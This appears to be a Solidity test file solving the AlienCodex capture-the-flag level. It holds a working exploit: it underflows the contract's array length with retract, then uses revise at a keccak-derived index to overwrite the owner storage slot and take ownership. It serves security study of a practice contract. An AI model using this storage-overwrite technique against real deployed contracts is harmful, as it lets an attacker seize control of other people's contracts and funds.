// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "ds-test/test.sol";
import "contracts5/19_AlienCodex.sol";

contract AttackerAlienCodexTest is DSTest {
    function testAlienCodex() external {
        AlienCodex alienCodex = new AlienCodex();

        alienCodex.make_contact();
        alienCodex.retract();

        assertTrue(alienCodex.owner() != msg.sender);
        alienCodex.revise(-uint256(keccak256(abi.encode(1))), bytes32(uint256(2**160) + uint256(msg.sender)));
        assertTrue(alienCodex.owner() == msg.sender);
    }
}
